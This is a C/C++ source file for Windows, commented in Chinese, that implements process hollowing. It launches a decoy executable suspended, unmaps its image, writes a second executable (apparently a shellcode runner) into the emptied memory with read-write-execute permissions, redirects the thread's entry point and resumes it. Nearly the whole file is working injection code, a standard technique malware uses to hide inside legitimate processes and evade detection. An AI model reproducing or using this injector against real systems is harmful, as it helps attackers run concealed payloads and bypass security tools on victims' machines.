#include<windows.h>
#include<TlHelp32.h>
#include<tchar.h>
#include<stdio.h>

char container_path[MAX_PATH] = "C:\\Users\\86175\\source\\repos\\ConsoleApplication11\\ConsoleApplication11\\body.exe";                  //被注入的傀儡进程
char content_path[MAX_PATH] = "C:\\Users\\86175\\source\\repos\\ConsoleApplication11\\ConsoleApplication11\\w32-exe-run-shellcode.exe";//注入的进程

int CreateProc(char*, PROCESS_INFORMATION*);//创建傀儡进程
int UnmapView(PROCESS_INFORMATION);//卸载傀儡进程内存映射
int Injection(PROCESS_INFORMATION);//实现注入
DWORD GetImageSize(char*);//获取SizeOfImage
DWORD GetEntryPoint();//获取OEP
DWORD GetImageBase(PROCESS_INFORMATION pi);//获取基址
DWORD GetImageBase();//获取基址

CONTEXT context;//定义线程上下文结构
HANDLE hfile;//要注入的文件的句柄
char* pBuffer;//将文件读入内存的指针

void main()
{
	PROCESS_INFORMATION pi;
	if (!CreateProc(container_path, &pi))//创建傀儡进程
		return;

	if (UnmapView(pi) != 0)//卸载映射
		return;

	if (Injection(pi) == 0)//实现注入
		return;
}

int CreateProc(char* path, PROCESS_INFORMATION* pi)
{
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));//初始化为0
	si.cb = sizeof(si);
	ZeroMemory(pi, sizeof(pi));
	return CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, pi);//以挂起的方式创建进程
}

int UnmapView(PROCESS_INFORMATION pi)
{
	typedef NTSTATUS(WINAPI* ZwUnmapViewOfSection)(HANDLE, LPVOID);//定义函数指针 
	ZwUnmapViewOfSection UnmapViewOfSection = (ZwUnmapViewOfSection)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "ZwUnmapViewOfSection");//获取函数基址
	context.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread, &context);//获取线程上下文
	DWORD base;
	ReadProcessMemory(pi.hProcess, (LPVOID)(context.Ebx + 8), &base, sizeof(DWORD), NULL);//读取傀儡进程基址
	return UnmapViewOfSection(pi.hProcess, (LPVOID)base);//卸载傀儡进程映射
}

int Injection(PROCESS_INFORMATION pi)
{

	DWORD result = 0;
	DWORD sizeImage = GetImageSize(content_path);//获取要注入进程的ImageSize
	DWORD ImageBase = GetImageBase();//获取IMageBase
	context.Eax = (GetEntryPoint() + ImageBase);//获取要注入的进程的入口点,eax中保存着入口点
	VirtualAllocEx(pi.hProcess, (LPVOID)ImageBase, sizeImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//在傀儡进程中申请要注入的进程所需要的空间大小，注意以注入的内容的ImageBase为基址，这样就不用修复重定位和IAT
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)ImageBase, pBuffer, PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew + pBuffer)->OptionalHeader.SizeOfHeaders, NULL))//将要注入的HEADER映射到傀儡进程
	{
		return result;
	}

	PIMAGE_SECTION_HEADER psection = IMAGE_FIRST_SECTION(PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew + pBuffer));
	for (DWORD i = 0; i < PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew + pBuffer)->FileHeader.NumberOfSections; i++)
	{
		if (!WriteProcessMemory(pi.hProcess, (LPVOID)(ImageBase + psection->VirtualAddress), pBuffer + psection->PointerToRawData, psection->SizeOfRawData, NULL))//将要注入的区块映射到傀儡进程
		{
			return result;
		}
		++psection;
	}

	if (!WriteProcessMemory(pi.hProcess, (BYTE*)context.Ebx + 8, &ImageBase, sizeof(DWORD), NULL))//将要注入的修改线程上下文中的ImageBase
	{
		return result;
	}

	SetThreadContext(pi.hThread, &context);//设置修改后的线程上下文
	ResumeThread(pi.hThread);//恢复线程
	result = 1;
	return result;
}

DWORD GetImageSize(char* path)//读入文件到内存
{
	DWORD result = 0;
	hfile = CreateFileA(content_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //打开要注入的文件
	if (hfile != INVALID_HANDLE_VALUE)
	{
		DWORD filesize = GetFileSize(hfile, NULL);
		pBuffer = new char[filesize];
		ReadFile(hfile, pBuffer, filesize, &filesize, NULL);
		PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
		if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
		{
			PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew + pBuffer);
			result = pNtHeaders->OptionalHeader.SizeOfImage; //遍历PE结构拿到SizeOfImage
		}
	}
	return result;
}

DWORD GetEntryPoint()
{
	DWORD result = 0;
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return  result;
	}
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew + pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	result = OptionalHeader->AddressOfEntryPoint; //遍历PE结构拿到AddressOfEntryPoint

	return result;
}

DWORD GetImageBase()
{
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew + pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	return OptionalHeader->ImageBase;//从PE结构找到ImageBase //400000 //ASLR
}